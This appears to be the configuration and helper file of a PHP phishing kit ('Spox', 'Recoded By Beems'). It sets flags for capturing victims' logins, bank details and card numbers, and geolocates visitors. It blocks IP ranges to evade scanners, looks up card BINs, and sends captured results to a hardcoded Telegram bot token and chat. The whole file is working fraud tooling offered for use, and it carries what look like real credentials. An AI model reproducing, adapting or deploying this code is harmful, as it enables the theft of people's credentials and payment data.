<?php
// Recoded By Beems
error_reporting(0);
include 'functions.php';
$rundomizi = bin2hex(openssl_random_pseudo_bytes(24));
$expired = date("YmdYmdYm");
//This is the oly config u have to do the rest is on admin panel ... open your link /admin
$admin_password = "test";

if($block_iprange == "on") {
    require_once 'blacklist.php';
}
if($onetime == "on") {
    require_once 'onetime.php';
}
//Google Captcha 
$site_key = "-";
$secret_key = "";


$SPOX_SESSION = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$rndm_spox = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 18);

$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
$email = "dfsdf@yahoo.com";
$redirect_password = "expiredcheck";
$resultpin = "234123";
    $sendfrom = "beems@fuckspox.com";
    $double_login = "on";
    $double_access = "on";
    $double_cc = "on";
    $text_result = "on";
    $send_result = "on";
    $redirect = "on";
    $onetime = "";
    $show_cc = "on";
    $show_bank = "on";
    $show_access = "on";
    $beems_protection = "on";
$details = get_ip1($ip_spox);
$details = json_decode($details, true);
$country_spox = $details['geoplugin_countryName'];
$country_code_spox = $details['geoplugin_countryCode'];

$city_spox = $details['geoplugin_city'];
$region_spox = $details['geoplugin_region'];
if($countryname == "") {
    $details = get_ip2($ip_spox);
    $details = json_decode($details, true);
    $country_spox = $details['country'];
    $country_code_spox = $details['countryCode'];
    $city_spox = $details['city'];
    $ISP_spox = $details['org'];
}

function text_spox($name, $message) {

    $spoxy = fopen($name,"a+");
    fwrite($spoxy,$message);
    fclose($spoxy);
    $lines = file($name);
    $lines = array_unique($lines);
    file_put_contents($name, implode($lines));
}
function text_spox2($name, $message) {
    $spoxy = fopen($name,"a+");
    fwrite($spoxy,$message);
    fclose($spoxy);
}

function new_file($name, $date) {
  $click = fopen("$name","a");
    fwrite($click,"$date"."\n");
    fclose($click);
}
$telegram_bot_token = "1081346222:AAFkuuxFEiByDq5Lj6WPmosfOubqtz5CduI";
$telegram_chat_id = "-1001409535183";
function kirim_tele($telegram_bot_token, $telegram_chat_id) {
    global $resulta;
    if (isset($resulta)) {
        $r1 = $resulta;
        $browserip = "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage?chat_id=".$telegram_chat_id."&text=";
        $r2 = urlencode($r1);
        $r3 = $browserip.$r2;
        $curl     = curl_init();
        curl_setopt($curl, CURLOPT_URL, $r3);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_exec($curl);
        curl_close($curl);
    }
}
function contains(array $arr, $str) {
    foreach($arr as $a) {
        if (stripos($a,$str) !== false) return true;
    }
    return false;
}
function check_bin($bin) {
      $bin = preg_replace('/\s/', '', $bin);
      $bin = substr($bin,0,8);
      $url = "https://lookup.binlist.net/".$bin;
      $headers = array();
      $headers[] = 'Accept-Version: 3';
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $resp=curl_exec($ch);
      curl_close($ch);
      $result = json_decode($resp, true);
      return $result;
}
?>